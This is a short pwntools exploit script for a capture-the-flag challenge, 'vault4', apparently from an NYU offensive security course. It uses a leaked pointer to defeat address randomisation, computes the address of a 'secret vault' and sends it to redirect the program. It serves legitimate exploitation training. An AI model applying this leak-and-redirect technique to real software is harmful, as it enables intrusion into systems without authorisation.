from pwn import *
CHALLENGE = "vault4"
PORT = 1234
NETID = b"<NET ID>"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
    fake_vault_offset = 0x4030
    secret_vault_offset = 0x4038
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)
    fake_vault_offset = 0x4030
    secret_vault_offset = 0x4038
p.recvuntil(b'I found this fake vault at: ')
raw_fake_vault = p.recvn(6)
fake_vault_addr = u64(raw_fake_vault.ljust(8, b'\x00'))
base_addr = fake_vault_addr - fake_vault_offset
secret_vault_addr = base_addr + secret_vault_offset
raw_secret_vault = p64(secret_vault_addr)[:6]
p.send(raw_secret_vault)
p.interactive()
